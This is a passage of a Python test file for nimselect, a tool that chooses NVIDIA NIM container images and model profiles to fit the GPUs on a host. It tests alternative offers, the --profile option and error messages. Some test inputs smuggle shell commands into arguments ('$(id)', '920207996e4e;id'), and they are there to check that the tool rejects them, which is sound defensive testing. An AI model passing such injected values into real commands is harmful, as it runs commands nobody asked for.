    """A vllm profile, GPU-agnostic unless `fields` say, tested on the GPUs `tested`, with the
    workspace_hash FILES, as NGC records one for every profile."""
    return {
        "profile_id": pid,
        "precision": precision,
        "inference_backend": "vllm",
        "tensor_parallel_size": tp,
        "pipeline_parallel_size": 1,
        "min_vram_per_device_gb": 20.0,
        "feat_lora": False,
        "tested_gpu_devices": list(tested),
        "workspace_hash": FILES,
        **fields,
    }


def b200_routes(metadata: dict[str, Any] | None = None) -> dict[str, Any]:
    """The llama repo on B200s: 2.1.4 fits with a bf16 profile tested on the B200 and has an nvfp4
    one tested on no GPU; the DGX Spark variant has a profile for the H100 NVL only; 2.0.13 has an
    nvfp4 profile for 2 GPUs tested on the B200; 1.15.5 publishes nothing. `metadata` replaces
    some of them."""
    newest = meta(blackwell("bf16-tested", "bf16"), blackwell("nvfp4-untested", "nvfp4", ()))
    return select_routes(
        {
            f"{LLAMA_ID}:2.1.4": newest,
            f"{SPARK_ID}:1.0.0-variant": meta(profile("h100-only")),
            f"{LLAMA_ID}:2.0.13": meta(blackwell("nvfp4-tested-tp2", "nvfp4", tp=2)),
            **(metadata or {}),
        }
    )


def test_select_offers_the_faster_profile_of_an_older_image_within_max_gpus(
    tmp_path: Path,
) -> None:
    env = b200_env()
    code, payload, _ = run_select(tmp_path, b200_routes(), LLAMA_ID, env=env)
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload) == [
        ("2.1.4", "newest", "published", "fits"),
        ("1.0.0-variant", "variant", "published", "does_not_fit"),
        ("2.0.13", "older", "published", "fits"),
        ("1.15.5", "older", "not_published", None),
    ]
    assert facts["recommended"]["profile_id"] == "bf16-tested"
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        f"nvcr.io/{LLAMA_ID}:2.0.13",
        "older",
        True,
    )
    assert (alternative["profile_id"], alternative["gpus_required"]) == ("nvfp4-tested-tp2", 2)
    assert alternative["offer"] == (
        "faster (nvfp4, on 2 GPUs instead of 1) and tested on this GPU, but in the older image "
        "2.0.13"
    )
    [note] = [note for note in facts["notes"] if note.startswith("facts.alternative")]
    pinned = f"run select {LLAMA_ID} --tag 2.0.13 --profile=nvfp4-tested-tp2 with the other"
    assert pinned in note
    # --max-gpus 1 rules the 2-GPU profile out, so 2.0.13 does not fit: the untested nvfp4 profile
    # of 2.1.4 is offered instead, unconfirmed
    code, payload, _ = run_select(tmp_path, b200_routes(), LLAMA_ID, "--max-gpus", "1", env=env)
    assert code == 0, payload
    assert considered(payload)[2] == ("2.0.13", "older", "published", "does_not_fit")
    alternative = payload["facts"]["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        f"nvcr.io/{LLAMA_ID}:2.1.4",
        "newest",
        False,
    )
    assert alternative["profile_id"] == "nvfp4-untested"
    # an image select did not check is never offered: --max-images 1 checks the newest alone
    code, payload, _ = run_select(tmp_path, b200_routes(), LLAMA_ID, "--max-images", "1", env=env)
    assert code == 0, payload
    assert [item["tag"] for item in payload["facts"]["images_considered"]] == ["2.1.4"]
    assert payload["facts"]["alternative"]["confirmed"] is False
    # the user takes it: the select of the note checks that profile of 2.0.13 alone; it fits
    code, payload, _ = run_select(
        tmp_path, b200_routes(), LLAMA_ID, "--tag", "2.0.13", "--profile", "nvfp4-tested-tp2",
        env=env,
    )  # fmt: skip
    assert (code, payload["state"], payload["next"]) == (0, "fits", "confirm_with_user")
    handoff = payload["facts"]["handoff"]
    assert (handoff["image"], handoff["model_profile"], handoff["verdict"], handoff["gpus"]) == (
        f"nvcr.io/{LLAMA_ID}:2.0.13",
        "nvfp4-tested-tp2",
        "fits",
        "device=0,1",
    )


def test_the_first_image_checked_with_a_faster_profile_that_fits_is_offered(
    tmp_path: Path,
) -> None:
    """The hardware variant is checked before the older versions, so its profile built for the
    B200 is offered, with the variant's own repository in the select of the note. A chosen image
    with an nvfp4 profile that fits gets no offer, even when --top shows only its first profile."""
    variant = meta(blackwell("variant-nvfp4", "nvfp4", (), gpu_device=B200_PCI))
    routes = b200_routes({f"{SPARK_ID}:1.0.0-variant": variant})
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, env=b200_env())
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload)[1:3] == [
        ("1.0.0-variant", "variant", "published", "fits"),
        ("2.0.13", "older", "published", "fits"),
    ]
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["tier"]) == (
        f"nvcr.io/{SPARK_ID}:1.0.0-variant",
        "variant",
        "direct",
    )
    assert alternative["offer"] == (
        "faster (nvfp4) and built for this GPU, but in the hardware variant "
        "llama-3.1-8b-instruct-dgx-spark:1.0.0-variant"
    )
    [note] = [note for note in facts["notes"] if note.startswith("facts.alternative")]
    assert "it fits, but in a hardware variant, so ask whether that image is acceptable" in note
    assert f"run select {SPARK_ID} --tag 1.0.0-variant --profile=variant-nvfp4 with" in note
    # 2.1.4 has an nvfp4 profile that fits too, ranked after its bf16 one built for the B200
    newest = meta(
        blackwell("bf16-direct", "bf16", (), gpu_device=B200_PCI),
        blackwell("nvfp4-tested", "nvfp4"),
    )
    routes = b200_routes({f"{LLAMA_ID}:2.1.4": newest, f"{SPARK_ID}:1.0.0-variant": variant})
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, "--top", "1", env=b200_env())
    assert code == 0, payload
    facts = payload["facts"]
    assert [record["profile_id"] for record in facts["shortlist"]] == ["bf16-direct"]
    assert facts["alternative"] is None


def test_no_alternative_from_an_image_whose_select_takes_another_gpu_type() -> None:
    """Two B200 and one RTX PRO 6000: the image chosen fits on the RTX PRO alone. An older image
    whose nvfp4 profile fits on both GPU types picks the B200 (more GPUs), where its select would
    hand it off, so it is not offered for the RTX PRO; tested on the RTX PRO alone, it is."""
    rtx = {
        **b200_env(2)["groups"][0],
        "name": "NVIDIA RTX PRO 6000 Blackwell Server Edition",
        "pci_device_id": RTX_PRO_PCI,
        "pci_device_ids": [RTX_PRO_PCI],
        "memory_gb": 102.0,
        "compute_capability": "12.0",
        "count": 1,
        "idle": 1,
        "indices": [2],
        "idle_indices": [2],
    }
    env = h100_env(groups=[b200_env(2)["groups"][0], rtx])
    every = fit.FitOptions(top=nimselect.LIST_TOP)
    chosen = fit.evaluate({"profiles": [blackwell("bf16", "bf16", (RTX_PRO_PCI,))]}, env, every)
    assert (chosen["verdict"], chosen["group"]["name"]) == ("fits", rtx["name"])
    entries = [
        {"image": f"nvcr.io/{LLAMA_ID}:{tag}", "resource_id": LLAMA_ID, "tag": tag, "kind": kind}
        for tag, kind in (("2.1.4", "newest"), ("2.0.13", "older"))
    ]

    def older(*tested: str) -> dict[str, Any]:
        return fit.evaluate({"profiles": [blackwell("nvfp4", "nvfp4", tested)]}, env, every)

    both = older(B200_PCI, RTX_PRO_PCI)
    assert both["group"]["name"] == "NVIDIA B200"
    assert nimselect.other_image_alternative(0, entries, [chosen, both], "throughput") is None
    rtx_only = older(RTX_PRO_PCI)
    found = nimselect.other_image_alternative(0, entries, [chosen, rtx_only], "throughput")
    assert found is not None
    assert (found["image"], found["profile_id"], found["confirmed"]) == (
        f"nvcr.io/{LLAMA_ID}:2.0.13",
        "nvfp4",
        True,
    )
    # nothing is offered beside an image that does not fit
    unknown = fit.evaluate({"profiles": [blackwell("bf16", "bf16", ())]}, env, every)
    assert unknown["verdict"] == "unknown"
    assert nimselect.other_image_alternative(0, entries, [unknown, rtx_only], "throughput") is None


def test_no_alternative_from_a_hardware_variant_beside_another_gpu_type() -> None:
    """The select a note gives for an image of a hardware variant (another repository) also reads
    that repository's other images for their records, which this select did not read, so with
    another GPU type in the environment it could hand the profile off on that type: the variant's
    nvfp4 profile, tested on the RTX PRO 6000 alone, is not offered beside two B200. With the RTX
    PRO 6000 alone it is."""
    rtx = {**rtx_pro_env()["groups"][0], "indices": [2], "idle_indices": [2]}
    every = fit.FitOptions(top=nimselect.LIST_TOP)
    entries = [
        {"image": f"nvcr.io/{LLAMA_ID}:2.1.4", "resource_id": LLAMA_ID, "tag": "2.1.4",
         "kind": "newest"},
        {"image": f"nvcr.io/{SPARK_ID}:1.0.0-variant", "resource_id": SPARK_ID,
         "tag": "1.0.0-variant", "kind": "variant"},
    ]  # fmt: skip
    for env, offered in ((h100_env(groups=[b200_env(2)["groups"][0], rtx]), False),
                         (rtx_pro_env(), True)):  # fmt: skip
        rtx_only = (RTX_PRO_PCI,)
        chosen = fit.evaluate({"profiles": [blackwell("bf16", "bf16", rtx_only)]}, env, every)
        variant = fit.evaluate({"profiles": [blackwell("nvfp4", "nvfp4", rtx_only)]}, env, every)
        assert chosen["group"]["name"] == variant["group"]["name"] == rtx["name"]
        found = nimselect.other_image_alternative(0, entries, [chosen, variant], "throughput")
        assert (found is not None) is offered
        if found is not None:
            assert (found["image"], found["kind"]) == (entries[1]["image"], "variant")


def test_no_alternative_of_a_chosen_hardware_variant_beside_another_gpu_type(
    tmp_path: Path,
) -> None:
    """The base image fits neither GPU type; its dgx-spark variant fits on the RTX PRO 6000 with
    bf16, and its own nvfp4 profile, tested on no GPU, is faster. The select that would pin it
    (--tag, --profile) reads the variant repository's other images, which this select did not,
    so beside two B200 no alternative is named; with the RTX PRO 6000 alone it is."""
    images = {
        f"{LLAMA_ID}:2.1.4": meta(profile("h100-only")),
        f"{SPARK_ID}:1.0.0-variant": meta(
            blackwell("bf16-rtx", "bf16", (RTX_PRO_PCI,)), blackwell("nvfp4-any", "nvfp4", ())
        ),
    }
    rtx = {**rtx_pro_env()["groups"][0], "indices": [2], "idle_indices": [2]}
    two = h100_env(groups=[b200_env(2)["groups"][0], rtx])
    for env, offered in ((two, False), (rtx_pro_env(), True)):
        code, payload, _ = run_select(tmp_path, select_routes(images), env=env)
        assert code == 0, payload
        facts = payload["facts"]
        assert (facts["image"], facts["recommended"]["profile_id"]) == (
            f"nvcr.io/{SPARK_ID}:1.0.0-variant",
            "bf16-rtx",
        )
        assert facts["handoff"]["gpu_name"] == rtx["name"]
        alternative = facts["alternative"]
        assert (alternative and alternative["profile_id"]) == ("nvfp4-any" if offered else None)
        assert bool(alternative_notes(payload)) is offered


def rtx_pro_env() -> dict[str, Any]:
    """A host with one idle RTX PRO 6000 Blackwell Server Edition, a GPU that 1.8.0-RTX names."""
    rtx = {
        **b200_env(1)["groups"][0],
        "name": "NVIDIA RTX PRO 6000 Blackwell Server Edition",
        "pci_device_id": RTX_PRO_PCI,
        "pci_device_ids": [RTX_PRO_PCI],
        "memory_mib": 97887,
        "memory_gb": 102.64,
        "compute_capability": "12.0",
    }
    return h100_env(groups=[rtx])


def alternative_notes(payload: dict[str, Any]) -> list[str]:
    return [note for note in payload["facts"]["notes"] if note.startswith("facts.alternative")]


def test_the_select_of_an_alternative_reads_the_records_its_image_was_judged_with(
    tmp_path: Path,
) -> None:
    """Two B200 and four RTX PRO 6000. 2.1.6 fits best on the RTX PRO 6000 (fp8). On that GPU type
    2.1.5's vllm nvfp4 profile fits by its own record, and its TensorRT-LLM one `nvfp4-shared` by
    2.1.4's record alone, which makes the RTX PRO 6000 2.1.5's GPU type too (TensorRT-LLM ranks
    before the vllm profile 2.1.5 tests on the B200): the vllm profile is
    the alternative. The select its note gives reads 2.1.6 and 2.1.4 for their records as the first
    select did, so it picks the same GPU type and hands the profile off as fits; without 2.1.4's
    record it would pick the B200, where that profile is not tested."""
    rtx = {
        **rtx_pro_env()["groups"][0],
        "count": 4,
        "idle": 4,
        "indices": [2, 3, 4, 5],
        "idle_indices": [2, 3, 4, 5],
    }
    env = h100_env(groups=[b200_env(2)["groups"][0], rtx])
    trt = {"inference_backend": "tensorrt_llm"}
    routes = lightning_routes()
    for tag, document in {
        "2.1.6": meta(blackwell("fp8-rtx", "fp8", (RTX_PRO_PCI,)), blackwell("bf16-b200", "bf16")),
        "2.1.5": meta(
            blackwell("nvfp4-vllm-b200", "nvfp4", tp=2),
            blackwell("nvfp4-vllm-rtx", "nvfp4", (RTX_PRO_PCI,)),
            blackwell("nvfp4-shared", "nvfp4", (), **trt),
        ),
        "2.1.4": meta(blackwell("nvfp4-shared", "nvfp4", (RTX_PRO_PCI,), **trt)),
    }.items():
        routes[meta_key(LIGHTNING_ID, tag)] = document
    code, payload, _ = run_select(tmp_path, routes, LIGHTNING_ID, env=env)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["image"], facts["recommended"]["profile_id"]) == (
        f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        "fp8-rtx",
    )
    assert facts["handoff"]["gpu_name"] == rtx["name"]
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["profile_id"], alternative["confirmed"]) == (
        f"nvcr.io/{LIGHTNING_ID}:2.1.5",
        "nvfp4-vllm-rtx",
        True,
    )
    pinned = ("--tag", "2.1.5", "--profile", "nvfp4-vllm-rtx")
    code, payload, _ = run_select(tmp_path, routes, LIGHTNING_ID, *pinned, env=env)
    assert (code, payload["state"]) == (0, "fits")
    handoff = payload["facts"]["handoff"]
    assert (handoff["model_profile"], handoff["gpu_name"], handoff["gpus"]) == (
        "nvfp4-vllm-rtx",
        rtx["name"],
        "device=2",
    )


def test_the_repositorys_tag_for_the_gpu_is_offered_in_its_version_order(tmp_path: Path) -> None:
    """select checks 1.8.0-RTX, the repository's tag for this GPU, before the older versions, but
    the alternative goes newest version first: 2.0.13, newer than 1.8.0, with an nvfp4 profile
    tested here, comes before the fp8 profile of 1.8.0-RTX. Without it, 1.8.0-RTX is offered as
    what it is beside 2.1.4: an older image."""
    rtx = (RTX_PRO_PCI,)
    images = {
        f"{LLAMA_ID}:2.1.4": meta(blackwell("bf16-tested", "bf16", rtx)),
        f"{LLAMA_ID}:1.8.0-RTX": meta(blackwell("rtx-fp8", "fp8", rtx)),
        f"{LLAMA_ID}:2.0.13": meta(blackwell("nvfp4-tested", "nvfp4", rtx)),
    }
    code, payload, _ = run_select(tmp_path, select_routes(images, LLAMA_ID), env=rtx_pro_env())
    assert code == 0, payload
    assert considered(payload)[:3] == [
        ("2.1.4", "newest", "published", "fits"),
        ("1.8.0-RTX", "variant", "published", "fits"),
        ("2.0.13", "older", "published", "fits"),
    ]
    alternative = payload["facts"]["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["profile_id"]) == (
        f"nvcr.io/{LLAMA_ID}:2.0.13",
        "older",
        "nvfp4-tested",
    )
    assert alternative["offer"] == (
        "faster (nvfp4) and tested on this GPU, but in the older image 2.0.13"
    )
    images[f"{LLAMA_ID}:2.0.13"] = meta(blackwell("bf16-older", "bf16", rtx))
    code, payload, _ = run_select(tmp_path, select_routes(images, LLAMA_ID), env=rtx_pro_env())
    assert code == 0, payload
    alternative = payload["facts"]["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["profile_id"]) == (
        f"nvcr.io/{LLAMA_ID}:1.8.0-RTX",
        "variant",
        "rtx-fp8",
    )
    assert alternative["offer"] == (
        "faster (fp8) and tested on this GPU, but in the older image 1.8.0-RTX"
    )
    [note] = alternative_notes(payload)
    assert "it fits, but in an older version, so ask whether that image is acceptable" in note
    assert f"run select {LLAMA_ID} --tag 1.8.0-RTX --profile=rtx-fp8 with" in note


def test_an_alternative_newer_than_the_chosen_gpu_build_is_called_newer(tmp_path: Path) -> None:
    """2.1.4 has no profile for the RTX PRO 6000, so select takes 1.8.0-RTX, the repository's tag
    for this GPU. 2.0.13, a newer version than 1.8.0, fits with a faster profile: the offer and
    the note call it newer, as it is beside the image chosen, never older."""
    images = {
        f"{LLAMA_ID}:2.1.4": meta(profile("h100-only")),
        f"{LLAMA_ID}:1.8.0-RTX": meta(blackwell("rtx-bf16", "bf16", (), gpu_device=RTX_PRO_PCI)),
        f"{LLAMA_ID}:2.0.13": meta(blackwell("fp8-tested", "fp8", (RTX_PRO_PCI,))),
    }
    code, payload, _ = run_select(tmp_path, select_routes(images, LLAMA_ID), env=rtx_pro_env())
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["image"], facts["image_choice"]["kind"]) == (
        f"nvcr.io/{LLAMA_ID}:1.8.0-RTX",
        "variant",
    )
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        f"nvcr.io/{LLAMA_ID}:2.0.13",
        "older",
        True,
    )
    assert alternative["offer"] == (
        "faster (fp8) and tested on this GPU, but in the newer image 2.0.13"
    )
    [note] = alternative_notes(payload)
    assert "it fits, but in a newer version, so ask whether that image is acceptable" in note
    assert f"run select {LLAMA_ID} --tag 2.0.13 --profile=fp8-tested with" in note


def test_a_precision_outside_the_order_in_the_chosen_image_does_not_hide_the_alternative(
    tmp_path: Path,
) -> None:
    """2.1.4 fits with a bf16 profile and an int4 one, a precision the --prefer orders do not
    list, which says nothing of speed: the nvfp4 profile of 2.0.13 is faster than the recommended
    bf16 and is still offered. A recommended int4 profile gets no alternative."""
    nvfp4 = meta(blackwell("nvfp4-tested", "nvfp4"))
    newest = meta(blackwell("bf16-tested", "bf16"), blackwell("int4-tested", "int4"))
    routes = b200_routes({f"{LLAMA_ID}:2.1.4": newest, f"{LLAMA_ID}:2.0.13": nvfp4})
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, env=b200_env())
    assert code == 0, payload
    facts = payload["facts"]
    assert [record["profile_id"] for record in facts["shortlist"]] == [
        "bf16-tested",
        "int4-tested",
    ]
    assert (facts["alternative"]["image"], facts["alternative"]["profile_id"]) == (
        f"nvcr.io/{LLAMA_ID}:2.0.13",
        "nvfp4-tested",
    )
    newest = meta(blackwell("int4-tested", "int4"))
    routes = b200_routes({f"{LLAMA_ID}:2.1.4": newest, f"{LLAMA_ID}:2.0.13": nvfp4})
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, env=b200_env())
    assert code == 0, payload
    assert payload["facts"]["recommended"]["profile_id"] == "int4-tested"
    assert payload["facts"]["alternative"] is None


def test_an_image_the_note_could_not_pin_is_never_offered() -> None:
    """The note names the alternative's image in a select command and the hand-off pins it: an
    older line known only by its alias (`2.0`), a variant known only as latest, or a repository
    whose id a command line cannot carry as one word is never named; a fixed build is."""
    env = b200_env()
    every = fit.FitOptions(top=nimselect.LIST_TOP)
    chosen = fit.evaluate({"profiles": [blackwell("bf16", "bf16")]}, env, every)
    faster = fit.evaluate({"profiles": [blackwell("nvfp4", "nvfp4")]}, env, every)

    def entry(resource_id: str, tag: str, kind: str) -> dict[str, Any]:
        image = f"nvcr.io/{resource_id}:{tag}"
        return {"image": image, "resource_id": resource_id, "tag": tag, "kind": kind}

    newest = entry(LLAMA_ID, "2.1.4", "newest")
    for other in (
        entry(LLAMA_ID, "2.0", "older"),
        entry(SPARK_ID, "latest", "variant"),
        entry(f"{SPARK_ID}-$(id)", "1.0.0", "variant"),
    ):
        checked = [newest, other]
        assert nimselect.other_image_alternative(0, checked, [chosen, faster], "throughput") is None
    older = entry(LLAMA_ID, "2.0.13", "older")
    found = nimselect.other_image_alternative(0, [newest, older], [chosen, faster], "throughput")
    assert found is not None
    assert (found["image"], found["profile_id"]) == (older["image"], "nvfp4")
    # the note checks the image again: an alternative named by an alias is dropped with its note
    alias = entry(LLAMA_ID, "2.0", "older")
    facts: dict[str, Any] = {
        "source": "ngc",
        "resource_id": LLAMA_ID,
        "model": "meta/llama-3.1-8b-instruct",
        "tag": "2.1.4",
        "image": newest["image"],
        "images_considered": [newest, alias],
    }
    aliased = {**found, "image": alias["image"]}
    nimselect.add_fit_result(facts, {**chosen, "alternative": aliased}, env, "published", [])
    assert facts["alternative"] is None
    assert alternative_notes({"facts": facts}) == []


def test_select_profile_hands_off_that_profile_alone_unconfirmed(tmp_path: Path) -> None:
    out = tmp_path / "select.json"
    code, payload, requested = run_on_spark(
        tmp_path, "--tag", "2.1.6", "--profile", LIGHTNING_NVFP4, "--out", str(out)
    )
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("unknown", "ask_user")
    facts = payload["facts"]
    assert considered(payload) == [("2.1.6", "requested", "published", "unknown")]
    best = facts["best_unconfirmed"]
    assert (best["profile_id"], best["precision"], best["reasons"]) == (
        LIGHTNING_NVFP4,
        "nvfp4",
        ["gpu_not_tested"],
    )
    assert (facts["recommended"], facts["shortlist"], facts["alternative"]) == (None, [], None)
    assert [record["profile_id"] for record in facts["unconfirmed"]] == [LIGHTNING_NVFP4]
    assert (facts["profiles_total"], facts["rejected"]["total"]) == (1, 0)
    assert facts["handoff"] == {
        "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
        "image": f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        "model_profile": LIGHTNING_NVFP4,
        "verdict": "unknown",
        "backend": "vllm",
        "gpus": "device=0",
        "gpu_ids": [0],
        "gpu_count": 1,
        "gpu_name": "NVIDIA GB10",
        "confirm_with": "list-model-profiles",
    }
    assert (
        f"Only the profile {LIGHTNING_NVFP4} was checked (--profile): this result names no "
        "other profile of the image."
    ) in facts["notes"]
    assert fit.UNTESTED_NOTE in facts["notes"]
    assert json.loads(out.read_text(encoding="utf-8")) == facts
    # the older images, read for their test records, publish none here
    assert [path for path in requested if path.startswith(METADATA_PATH)] == [
        meta_key(LIGHTNING_ID, tag) for tag in ("2.1.6", "2.1.5", "2.1.4", "2.0.13")
    ]
    # the tested bf16 profile pinned the same way fits, ready for the confirm question
    code, payload, _ = run_on_spark(tmp_path, "--tag", "2.1.6", "--profile", LIGHTNING_BF16)
    assert (code, payload["state"], payload["next"]) == (0, "fits", "confirm_with_user")
    assert payload["facts"]["handoff"]["model_profile"] == LIGHTNING_BF16


def test_select_profile_the_image_lacks_is_profile_not_found(tmp_path: Path) -> None:
    out = tmp_path / "select.json"
    out.write_text('{"earlier": true}', encoding="utf-8")
    short = LIGHTNING_NVFP4[:12]  # ids are matched in full
    code, payload, _ = run_on_spark(
        tmp_path, "--tag", "2.1.6", "--profile", short, "--out", str(out)
    )
    assert code == 2
    assert (payload["ok"], payload["state"], payload["next"]) == (False, "select", "fix_errors")
    [error] = payload["errors"]
    assert error["code"] == "profile_not_found"
    assert error["message"] == (
        f"the metadata of nvcr.io/{LIGHTNING_ID}:2.1.6 has no profile {short} (ids are matched "
        "in full)"
    )
    for named in ("facts.shortlist", "facts.unconfirmed", "facts.alternative"):
        assert named in error["fix"]
    [entry] = payload["facts"]["images_considered"]
    assert (entry["metadata"], entry["verdict"], entry["error_code"]) == (
        "published",
        None,
        "profile_not_found",
    )
    # the earlier result, whose hand-off still stands, is kept
    assert json.loads(out.read_text(encoding="utf-8")) == {"earlier": True}


def test_select_profile_without_a_tag_takes_the_first_image_that_has_it(tmp_path: Path) -> None:
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": FITS,
            f"{SPARK_ID}:1.0.0-variant": OTHER_GPU,
            f"{LLAMA_ID}:2.0.13": meta(profile("fits-older"), profile("fits-here")),
        }
    )
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, "--profile", "fits-older")
    assert code == 0, payload
    assert considered(payload) == [
        ("2.1.4", "newest", "published", None),
        ("1.0.0-variant", "variant", "published", None),
        ("2.0.13", "older", "published", "fits"),
        ("1.15.5", "older", "not_published", None),
    ]
    facts = payload["facts"]
    codes = [item["error_code"] for item in facts["images_considered"]]
    assert codes == ["profile_not_found", "profile_not_found", None, None]
    assert [record["profile_id"] for record in facts["shortlist"]] == ["fits-older"]
    assert facts["handoff"]["model_profile"] == "fits-older"
    assert facts["image_choice"]["reason"] == (
        "older version: the newer images checked are not confirmed to fit (2.1.4: no profile "
        "with the id asked for (--profile); llama-3.1-8b-instruct-dgx-spark:1.0.0-variant: no "
        "profile with the id asked for (--profile))"
    )
    # no image has it: profile_not_found names the images that publish profiles but not that one
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, "--profile", "nowhere")
    assert code == 2, payload
    [error] = payload["errors"]
    assert error["code"] == "profile_not_found"
    for image in (f"{LLAMA_ID}:2.1.4", f"{SPARK_ID}:1.0.0-variant", f"{LLAMA_ID}:2.0.13"):
        assert f"nvcr.io/{image}" in error["message"]
    assert "1.15.5" not in error["message"]  # it publishes no profile at all


@pytest.mark.parametrize("value", ["", "920207996e4e 0", "$(id)", "920207996e4e;id"])
def test_select_profile_is_one_id(tmp_path: Path, value: str) -> None:
    env_file = write_env(tmp_path, spark_env())
    code, payload = run_cli(
        "nimselect.py",
        "select",
        LIGHTNING_ID,
        "--env",
        str(env_file),
        "--profile",
        value,
        direct=True,
    )
    assert code == 2
    [error] = payload["errors"]
    assert error["code"] == "bad_input" and "--profile" in error["message"]


def test_select_help_says_when_to_use_profile() -> None:
    proc = subprocess.run(
        [sys.executable, "-I", "-B", str(SCRIPTS / "nimselect.py"), "select", "--help"],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=60,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    text = " ".join(proc.stdout.split())
    assert "[--profile ID]" in text
    assert "Use it when the user takes facts.alternative" in text
    assert "--tag TAG --profile=ID" in text


def test_fit_offers_the_alternative_with_the_select_that_pins_it(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, spark_env())
    with serve(lightning_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LIGHTNING_ID,
            "--tag",
            "2.1.6",
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["recommended"]["profile_id"], facts["alternative"]["profile_id"]) == (
        LIGHTNING_BF16,
        LIGHTNING_NVFP4,
    )
    # fit checks one image: its own profile, unconfirmed, with no image kind
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        None,
        False,
    )
    pinned = f"run select {LIGHTNING_ID} --tag 2.1.6 --profile={LIGHTNING_NVFP4}"
    taken = f"{pinned} with the other options as before but --out {nimselect.ALTERNATIVE_OUT} ("
    assert sum(taken in n for n in facts["notes"]) == 1  # the first select's file stays
    # With --metadata-file nothing is offered: that select reads the metadata NGC publishes, not
    # the file. Here NGC publishes none for 2.1.6, so it would check no profile at all.
    document = fixture("ngc", "metadata-nemotron-3.5-lightning-30b-a3b-2.1.6.json")
    with serve(lightning_routes("2.1.5")) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LIGHTNING_ID,
            "--tag",
            "2.1.6",
            "--env",
            str(env_file),
            "--metadata-file",
            str(document),
            env=ngc_env(server),
        )
        assert code == 0, payload
        facts = payload["facts"]
        assert (facts["metadata"], facts["recommended"]["profile_id"], facts["alternative"]) == (
            "file",
            LIGHTNING_BF16,
            None,
        )
        assert not any(note.startswith("facts.alternative") for note in facts["notes"])
        code, payload = run_cli(
            "nimselect.py",
            "select",
            LIGHTNING_ID,
            "--tag",
            "2.1.6",
            "--profile",
            LIGHTNING_NVFP4,
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
    assert (code, payload["state"]) == (ns.EXIT_PRECONDITION, "no_metadata"), payload


def test_select_profile_keeps_the_gpu_type_of_the_select_it_came_from(tmp_path: Path) -> None:
    """A host with the GB10 (GPU 0) and two RTX PRO 4500 (GPUs 1 and 2): the nvfp4 profile is
    untested on both types, and on its own the type with more GPUs would win. The select pinned
    to it hands it off on GPU 0, the GB10 the first select chose and offered it for."""
    rtx = {
        **spark_env()["groups"][0],
        "name": "NVIDIA RTX PRO 4500 Blackwell Server Edition",
        "pci_device_id": "2c3a:10de",
        "pci_device_ids": ["2c3a:10de"],
        "memory_mib": 32623,
        "memory_gb": 34.2,
        "unified_memory": False,
        "compute_capability": "12.0",
        "count": 2,
        "idle": 2,
        "indices": [1, 2],
        "idle_indices": [1, 2],
    }
    env = {**spark_env(), "groups": [spark_env()["groups"][0], rtx]}
    routes = lightning_routes()
    code, payload, _ = run_select(tmp_path, routes, LIGHTNING_ID, "--tag", "2.1.6", env=env)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["handoff"]["gpus"], facts["alternative"]["profile_id"]) == (
        "device=0",
        LIGHTNING_NVFP4,
    )
    code, payload, _ = run_select(
        tmp_path, routes, LIGHTNING_ID, "--tag", "2.1.6", "--profile", LIGHTNING_NVFP4, env=env
    )
    assert code == 0, payload
    facts = payload["facts"]
    handoff = facts["handoff"]
    assert (handoff["model_profile"], handoff["verdict"], handoff["gpus"], handoff["gpu_name"]) == (
        LIGHTNING_NVFP4,
        "unknown",
        "device=0",
        "NVIDIA GB10",
    )
    assert (
        f"Only the profile {LIGHTNING_NVFP4} was checked (--profile), on the GPU type select picks "
        "without it (NVIDIA GB10): this result names no other profile of the image."
    ) in facts["notes"]
    # the summary of each GPU type names its PCI ids too
    assert [g["pci_device_ids"] for g in facts["environment_summary"]["groups"]] == [
        ["2e12:10de"],
        ["2c3a:10de"],
    ]


def test_select_profile_names_an_image_whose_metadata_could_not_be_read(tmp_path: Path) -> None:
    """No image read has the id, but one could not be read: the error says so, never only that
    the id is wrong."""
    failure = (500, {"requestStatus": {"statusCode": "INTERNAL_ERROR", "requestId": "req-500"}})
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": failure,
            f"{SPARK_ID}:1.0.0-variant": OTHER_GPU,
            f"{LLAMA_ID}:2.0.13": FITS,
        }
    )
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, "--profile", "nowhere")
    assert code == 2, payload
    [error] = payload["errors"]
    assert error["code"] == "profile_not_found"
    assert error["message"] == (
        f"the metadata of nvcr.io/{SPARK_ID}:1.0.0-variant, nvcr.io/{LLAMA_ID}:2.0.13 has no "
        "profile nowhere (ids are matched in full); the metadata of "
        f"nvcr.io/{LLAMA_ID}:2.1.4 could not be read (see facts.images_considered[].error), so "
        "whether it has that profile is not known"
    )
    assert "run the same select again later" in error["fix"]


